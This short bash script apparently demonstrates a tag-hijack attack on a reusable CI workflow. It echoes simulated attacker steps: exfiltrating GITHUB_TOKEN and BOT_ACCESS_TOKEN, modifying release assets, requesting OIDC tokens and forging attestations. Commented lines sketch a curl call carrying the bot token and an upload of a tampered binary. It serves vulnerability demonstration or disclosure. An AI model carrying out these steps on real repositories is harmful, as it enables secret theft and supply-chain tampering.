#!/bin/bash
# === MALICIOUS VERSION (tag hijack) ===
# If this were a real reusable workflow, the attacker now controls
# all permissions delegated by the caller:
#   - contents:write  -> modify release assets
#   - id-token:write  -> request OIDC tokens
#   - attestations:write -> forge provenance
#   - BOT_ACCESS_TOKEN -> push to BCR fork, open PRs

echo "[ATTACKER] Exfiltrating secrets..."
echo "[ATTACKER] GITHUB_TOKEN, BOT_ACCESS_TOKEN accessible here"
echo "[ATTACKER] Modifying release assets..."
echo "[ATTACKER] Requesting OIDC token..."
echo "[ATTACKER] Creating fraudulent attestation..."

# In real attack: curl -H "Authorization: Bearer $BOT_ACCESS_TOKEN" ...
# In real attack: gh release upload ... (tampered binary)
